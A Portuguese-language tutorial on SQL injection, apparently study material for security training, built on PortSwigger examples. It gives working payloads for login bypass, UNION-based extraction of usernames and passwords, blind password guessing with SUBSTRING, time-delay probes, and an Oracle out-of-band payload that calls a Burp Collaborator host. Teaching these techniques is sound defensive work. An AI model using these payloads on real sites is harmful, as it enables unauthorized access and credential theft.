# SQL Injection

É uma vulnerabilidade web que permite ao atacante interferir nas _queries_ \(consultas\) feitas para o banco de dados de certa aplicação.

Em geral, o atacante consegue visualizar dados armazenados no banco de dados que ele não deveria poder ver \(informação de outros usuários, dados da aplicação, senhas etc.\). Além disso, pode ser que o atacante consiga modificar e deletar dados do DB e, em casos mais extremos, escalar o ataque para comprometer o funcionamento do _back-end_ da aplicação ou performar um ataque DoS. De forma similar, ele pode subverter a lógica de certas aplicações e, por exemplo, passar pelo portal de login de algum site sem ter uma conta.

## Exemplos de SQL Injections

Vulnerabilidades desse tipo apresentam-se nas mais diferentes formas. Para cada situação de ataque, é possível que haja uma abordagem diferente.

Usaremos como base os exemplos da [Portswigger](https://portswigger.net/web-security/sql-injection), a fim de explicar um pouco sobre diferentes tipos de SQL Injections.

### Exemplo 1: modificando uma query para obter dados adicionais

Considere uma aplicação que distribui seus produtos em categorias. Quando o usuário clica na categoria "Presentes", o navegador manda uma requisição para o servidor da forma:

```text
https://insecure-website.com/products?category=Gifts
```

Em seguida, a aplicação fará uma consulta no banco de dados, buscando os produtos da categoria "Presentes". A _query_ utilizada seria, por exemplo:

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

Essa consulta quer obter todas as informações \(\*\), ou seja, todas as colunas da base de dados, referentes à tabela "products" nas quais a categoria do produto \("category" é uma das colunas\) é "Gifts".

Considerando que a aplicação não implementa defesas contra SQL Injections, um atacante poderia construir uma entrada do tipo `Gifts'+OR+1=1--` e colocá-la na URL:

```text
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Isso resultado na query:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--'
```

_Obs.: o `+` transforma-se em espaço_

Nesse caso, a consulta quer obter todas as informações \(\*\) da tabela de produtos \("products"\), mas só da categoria "Gifts" **ou 1 = 1**. Num primeiro momento isso pode parecer estranho, mas essa query está buscando todas as informações da tabela de produtos de **todos** os produtos, porque a condição para um produto ser selecionado pela consulta é que ele deve ser da categoria "Gifts" ou _1 deve ser igual à 1, o que sempre é verdade!_. Dessa forma, o atacante recebe como resposta todas as entradas da tabela produtos.

Além disso, note que há um `--` ao final da entrada do atacante. Isso representa, em certos bancos de dados \(e nesse caso\), um comentário. Logo, tudo que estiver escrito após isso será considerado um comentário. Isso é necessário para que a _query_ termine com o código do atacante e ignore todo o resto. Por exemplo, se a consulta fosse

```sql
SELECT * FROM products WHERE category = '<entrada_do_atacante>' AND (price < 100)
```

Se o resto da consulta \(`' AND (price < 100)`\) não for comentado, o atacante não obterá tudo que quer ou a consulta dará erro. Entretanto, se houver um `--` ao final da entrada, não haverá problemas \(`blabla' OR 1=1 --`\):

```sql
SELECT * FROM products WHERE category = 'blabla' OR 1=1 --' AND (price < 100)
```

### Exemplo 2: acessando uma conta de administrador sem saber a senha

Considere um portal de login, com usuário e senha. Se alguém submeter o usuário "mineboy2007" e a senha "sadgoat123", a aplicação checa as credenciais a partir da _query_ SQL:

```sql
SELECT * FROM users WHERE username = 'mineboy2007' AND password = 'sadgoat123'
```

Se ela retornar as informações do usuário, o login é um sucesso. Do contrário, ele falha.

Nesse cenário, um atacante poderia logar como qualquer usuário ao remover a checagem de senha ao inserir um comentário na _query_. Ele pode submeter, por exemplo, o usuário `admin' --` e qualquer coisa na senha \(pois ela não será verificada\). Assim, _query_ SQL fica:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

Essa _query_ irá retornar o usuário cujo nome é "admin" \(independentemente da senha estar correta ou não\) e logará o atacante no portal \(como administrador\).

## [SQL Injection UNION Attack](https://portswigger.net/web-security/sql-injection/union-attacks)

Se o resultado da _query_ é retornado pela resposta da aplicação e ela é vulnerável à SQL Injection, provavelmente é possível utilizar um **UNION Attack** para obter informações de outras tabelas do banco de dados. Esse ataque consiste em utilizar o `UNION`, que permite a execução de SELECTs adicionais em uma _query_. Por exemplo, a _query_ abaixo retorna 4 colunas: a, b \(da table\_1\) e c, d \(da table\_2\).

```sql
SELECT a, b FROM table_1 UNION SELECT c, d FROM table_2
```

Para uma _query_ com UNION funcionar, é necessário que:

* Cada SELECT, antes e depois do UNION, tenha a mesma quantidade de colunas \(ex.: na _query_ acima, estamos buscando 2 colunas no primeiro SELECT e 2 colunas no segundo SELECT\);
* O tipo de dado de cada coluna seja correspondente entre as _queries_ individualmente \(ex.: na _query_ acima, a coluna 'a' deve ser do mesmo tipo da coluna 'c' e a coluna 'b' deve ser do mesmo tipo da coluna 'd'\).

### Dicas para esse tipo de ataque

#### Descobrir número de colunas da tabela

Para descobrir o número de colunas presentes na tabela, podemos usar o `ORDER BY` + `índice da coluna na tabela`. Esse comando ordena as respostas \(por ordem alfabética por exemplo\) de acordo com certa coluna. Para descobrir a quantidade de colunas da tabela, basta ir aumentando o índice da coluna no `ORDER BY`. Quando o servidor responder com um erro para o `ORDER BY X`, sabemos que a coluna X não existe e, portanto, a tabela tem X-1 colunas.

```sql
'       blabla' ORDER BY 1 --
'       blabla' ORDER BY 2 --
'       blabla' ORDER BY 3 --
```

Se o erro for enviado ao cliente de forma explícita, ele deve ser algo como `"The ORDER BY position number 3 is out of range of the number of items in the select list."`

Outra opção para descobrir o número de colunas é utilizar ORDER BY passando vários NULL como "colunas" de ordenação:

```sql
'       blabla' ORDER BY NULL, NULL -- tabela tem pelo menos 2 colunas se não retornar erro
'       blabla' ORDER BY NULL, NULL, NULL -- tabela tem pelo menos 3 colunas se não retornar erro
```

#### Descobrir tipo de dado de certa coluna

Sabendo o número de colunas da tabela é possível descobrir o tipo de dado em cada coluna. Para isso, é necessário realizar testes com _queries_ do tipo:

```sql
'       blabla' UNION SELECT 'a',NULL,NULL,NULL --
'       blabla' UNION SELECT NULL,'a',NULL,NULL --
'       blabla' UNION SELECT NULL,NULL,'a',NULL --
'       blabla' UNION SELECT NULL,NULL,NULL,'a'--
```

Ao submeter, por exemplo, `' UNION SELECT 'a',NULL,NULL,NULL --`, testaremos se a 1ª coluna contém strings, pois estamos fazendo um UNION, ou seja, o dado da 1ª coluna do 1º SELECT deve ser do mesmo tipo que o da 1ª coluna do 2º SELECT \(o mesmo vale para as outras colunas\). Caso o servidor responda com um erro \(como `Conversion failed when converting the varchar value 'a' to data type int.`\), sabemos que a primeira coluna não contém strings \(varchar\). Do contrário, se a _query_ for um sucesso, a primeira coluna armazena strings.

`NULL` pode ser convertido para qualquer tipo, portanto não haverá problemas relacionados a tipos de dado incompatíveis ao utilizá-lo num UNION.

## [Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)

Já escrevi muita coisa para essa introdução, agora é com vocês: pesquisem!

* Checar o começo de uma senha com `SUBSTRING`: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '` + `pwn' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--` -&gt; `TRUE` =&gt; 1ª letra da senha é maior que 'm'\(usar SUBSTR ou SUBSTRING - depende do DB\)
* Outra possibilidade de teste é: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '` + `pwn' UNION SELECT 'a' WHERE 1=1--`

## Extra

* Para exibir a lista de tabelas do DB \(exceto DBs da Oracle\): 

  ```sql
  SELECT * FROM information_schema.tables
  ```

-Para exibir lista de colunas de uma tabela:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

* Em DBs da Oracle, usa-se:

  ```sql
  SELECT * FROM all_tables -- listar tabelas
  SELECT * FROM all_tab_columns WHERE table_name = 'nome_da_tabela' -- listar colunas
  ```

* Em DBs da Oracle, um `SELECT` sempre deve conter um `FROM <nome_da_tabela>`. Para isso, uma tabela "padrão" para se usar é `DUAL`
* Para concatenar resultados \(colunas diferentes\) em uma coluna, pode-se usar o `||`: `' UNION SELECT username || '~' || password FROM users -- -` \(ORACLE e POSTGRE\) ou `'foo'+'bar'` \(MICROSOFT\) ou `'foo' 'bar'` e `CONCAT('foo','bar')` \(MYSQL\)

_Para ver mais, procure por "SQL Injection Cheat Sheets" como_ [_essa_](https://portswigger.net/web-security/sql-injection/cheat-sheet) _ou_ [_essa_](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)_._

## Como detectar uma SQL Injection?

Ferramentas como Burpsuite ou Sqlmap são capazes de detectar diversas vulnerabilidades relacionadas à SQL Injection de forma automática, mas também podemos realizar alguns testes simples para verificar se há falhas no sistema responsável pela comunicação com o banco de dados. Alguns desses testes são:

* Enviar aspas simples \(`'`\);
* Enviar condicionais como `OR 1=1` e `OR 1=2`;
* Enviar _payloads_ com _triggers_ de tempo \(_delay_\) como `'; IF (1=2) WAITFOR DELAY '0:0:10'--` e analisar o tempo de resposta;
* Enviar _payloads_ de OAST \([Out-of-band Application Security Testing](https://portswigger.net/blog/oast-out-of-band-application-security-testing)\) que causam certos _triggers_ e monitorar interações com sistemas externos.
  * Já que não explicamos sobre isso, segue um exemplo:

    ```sql
      '||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE root [ <!ENTITY % ekiom SYSTEM "http://pibw1f1nhjh3vpkgtx6mtfnt8kea2eq8dy1n.burpcollab'||'orator.net/"> %ekiom;]>'),'/l') from dual)||' 
      -- conecta com um servidor de colaborador do Burp (faz uso de XML/DTD)
    ```

## Links externos

* [Portswigger](https://portswigger.net/web-security/sql-injection)
* [OWASP](https://owasp.org/www-community/attacks/SQL_Injection)
* [Acunetix](https://www.acunetix.com/websitesecurity/sql-injection/)

* [Slides](https://docs.google.com/presentation/d/1b4_fIMaTUPHAttJusjnAbkdXcLSwSJiV9X3IfRGP0yI/edit?usp=sharing)

